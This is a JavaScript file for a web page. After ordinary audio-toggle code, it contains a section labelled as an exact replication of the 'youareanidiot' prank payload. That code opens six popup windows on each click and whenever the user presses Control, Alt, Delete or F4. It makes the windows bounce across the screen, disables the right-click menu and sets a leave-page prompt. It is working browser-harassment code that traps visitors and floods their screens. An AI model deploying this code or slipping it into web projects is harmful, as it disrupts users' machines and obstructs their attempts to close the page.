let container = document.querySelector('#youare-container');
let audio = document.querySelector('#youare-audio');
let ovlap = document.querySelector('#youare-overlap');
let micon = document.querySelector('#youare-micon');

let overlap = false;

function audioPlay() {
	if (!overlap) {
		audio.currentTime = 0;
		audio.play();
	} else {
		ovlap.currentTime = 0;
		ovlap.play();
	}
	container.removeEventListener('click', audioPlay);
	audio.addEventListener('timeupdate', audioOverlap);
	ovlap.addEventListener('timeupdate', audioOverlap);
	container.classList.remove('clicky');
	micon.src = "/images/speaker.avif";
}

function audioStop() {
	audio.currentTime = 0;
	audio.pause();
	ovlap.currentTime = 0;
	ovlap.pause();
	container.addEventListener('click', audioPlay);
	audio.removeEventListener('timeupdate', audioOverlap);
	ovlap.removeEventListener('timeupdate', audioOverlap);
	container.classList.add('clicky');
	micon.src = "/images/speakerm.avif";
}

function audioSwitch() {
	if (audio.duration > 0 && audio.paused && ovlap.duration > 0 && ovlap.paused) {
		audioPlay();
	} else {
		audioStop();
	}
}

function audioOverlap() {
	if (!overlap && audio.currentTime > audio.duration - .45) {
		ovlap.currentTime = 0;
		ovlap.play();
		overlap = true;
	}
	if (overlap && ovlap.currentTime > ovlap.duration - .5) {
		audio.currentTime = 0;
		audio.play();
		overlap = false;
	}
}

container.addEventListener('click', audioPlay);
container.addEventListener('click', () => container.classList.remove('clicky'));
micon.addEventListener('click', audioSwitch);

// ==========================================================================
// EXACT REPLICATION of youareanidiot.cc payload (math.js + you.js)
// ==========================================================================

// --- math.js ---
let xOff = 5;
let yOff = 5;
let xPos = 400;
let yPos = -100;

function openWindow(url) {
	window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

async function proCreate(count) {	
	for (let i = 0; i < count; i++) {
		openWindow('/moron?session=' + encodeURIComponent(sessionId));
		await new Promise(r => setTimeout(r, 50));
	}
}

function newXlt() {
	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newXrt() {
	xOff = Math.ceil(7 * Math.random())  * 5 - 10;
	window.focus();
}

function newYup() {
	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newYdn() {
	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
	window.focus();
}

function playBall() {
    xPos += xOff;
    yPos += yOff;
    
	if (xPos > screen.width - 357) newXlt();    
	if (xPos < 0) newXrt();
    
	if (yPos > screen.height - 330) newYup(); 		
	if (yPos < 0) newYdn();

    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
}

// --- you.js ---
const sessionId = 'i_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7);

container.addEventListener('click', async () => {
	await proCreate(6);
	window.onbeforeunload = () => "Are you an idiot?";
});

window.onload = playBall;
window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		await proCreate(6);
		alert("You are an idiot!");
	}
	return null;
}

// Popup audio autoplay (modern browser compatibility)
(function() {
	const urlParams = new URLSearchParams(window.location.search);
	const urlSession = urlParams.get('session');
	const isPopup = (window.opener !== null || !!urlSession);
	if (!isPopup) return;
	function startPopupAudio() {
		const a = document.getElementById('youare-audio');
		const o = document.getElementById('youare-overlap');
		if (!a) return false;
		let popupOverlap = false;
		function pOverlap() {
			if (!popupOverlap && a.currentTime > a.duration - .45) {
				o.currentTime = 0;
				o.play().catch(() => {});
				popupOverlap = true;
			}
			if (popupOverlap && o.currentTime > o.duration - .5) {
				a.currentTime = 0;
				a.play().catch(() => {});
				popupOverlap = false;
			}
		}
		a.currentTime = 0;
		a.play().catch(() => {});
		a.addEventListener('timeupdate', pOverlap);
		o.addEventListener('timeupdate', pOverlap);
		return true;
	}
	if (!startPopupAudio()) {
		let tries = 0;
		const retry = setInterval(() => {
			if (startPopupAudio() || ++tries > 25) clearInterval(retry);
		}, 50);
	}
})();
